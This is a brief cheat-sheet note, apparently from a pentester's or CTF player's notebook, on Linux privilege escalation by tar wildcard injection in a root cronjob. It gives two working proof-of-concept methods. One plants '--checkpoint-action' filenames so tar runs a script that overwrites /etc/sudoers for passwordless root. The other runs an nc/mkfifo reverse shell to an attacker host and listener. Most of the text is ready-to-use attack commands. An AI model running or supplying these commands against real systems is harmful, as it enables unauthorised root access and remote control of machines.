when .tar is combined with a wildcard in a cronjob, this makes for a fairly simple priv esc

https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa

NOTE:
Before proceeding, note that we must be in the directory that root is executing the tar command from...
	pspy64 MIGHT NOT show it...
	check logs (like syslog) if able to
	etc...
		an example is /opt/admin

PoC
```bash
METHOD 1: /etc/sudoers
cd <dir_that_root_executes_cronjob_from>
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'

# Create a privesc.sh bash script, that allows for privilege escalation

privesc.sh
	echo '<our_user> ALL=(root) NOPASSWD: ALL' > /etc/sudoers

# wait for cron to execute
# verify our new sudo perms
sudo -l

# privesc ;)
sudo su

________________________________________________

METHOD 2: Reverse Shell
cd <dir_that_root_executes_cronjob_from>
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc <LHOST> <LPORT> >/tmp/f" > privesc.sh

# start listener
nc -lvnp <LPORT>

# wait for cronjob to execute ;)
```